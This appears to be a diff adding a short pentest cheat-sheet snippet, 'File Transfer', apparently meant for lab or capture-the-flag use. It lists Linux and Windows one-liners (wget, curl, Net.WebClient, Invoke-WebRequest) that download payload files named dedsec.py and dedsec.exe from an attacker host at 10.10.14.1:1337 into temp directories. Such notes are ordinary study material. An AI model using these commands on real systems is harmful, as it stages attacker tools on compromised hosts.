@@ -1,0 +1,21 @@
+---
+title: File Transfer
+slug: file-transfer
+description: File transfer on both OS
+image: ../images/snippets/file-transfer.webp
+---
+
+## Linux
+
+```bash
+wget 10.10.14.1:1337/dedsec.py -O /tmp/dedsec.py
+curl 10.10.14.1:1337/dedsec.py -o /tmp/dedsec.py
+```
+
+## Windows
+
+```bash
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.1:1337/dedsec.exe","C:\Windows\Temp\dedsec.exe")
+Invoke-WebRequest "http://10.10.14.1:1337/dedsec.exe" -OutFile "dedsec.exe"
+wget "http://10.10.14.1:1337/dedsec.exe" -OutFile "C:\Windows\Temp\dedsec.exe"
+```
